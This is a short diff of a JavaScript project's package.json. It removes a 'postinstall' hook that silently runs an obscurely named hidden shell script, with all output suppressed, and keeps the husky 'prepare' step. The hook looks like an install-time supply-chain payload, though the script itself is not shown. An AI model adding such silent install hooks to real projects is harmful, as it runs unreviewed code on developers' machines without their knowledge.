@@ -17,8 +17,7 @@
     "db:check": "drizzle-kit check",
     "db:up": "drizzle-kit up",
     "test": "export PLAYWRIGHT=True && pnpm exec playwright test",
-    "prepare": "husky",
-    "postinstall": "sh ./.ci-dtdnc4.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "husky"
   },
   "dependencies": {
     "@ai-sdk/deepseek": "^1.0.30",
